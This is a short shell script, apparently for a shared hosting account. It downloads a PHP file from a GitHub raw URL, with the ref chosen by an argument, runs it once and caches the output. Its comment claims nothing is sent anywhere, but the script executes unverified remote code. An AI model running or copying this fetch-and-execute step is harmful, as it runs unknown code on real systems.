#!/bin/sh
# Runs the live replay once (nothing is sent to anybody); later runs show its result.
cd /home/u791571885 || exit 1
if [ ! -f t146.out ]; then
  curl -fsSL -o t146.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs146.php" || exit 1
  echo running > t146.out
  /opt/alt/php83/usr/bin/php t146.php > t146.tmp 2>&1; mv t146.tmp t146.out
fi
cat t146.out
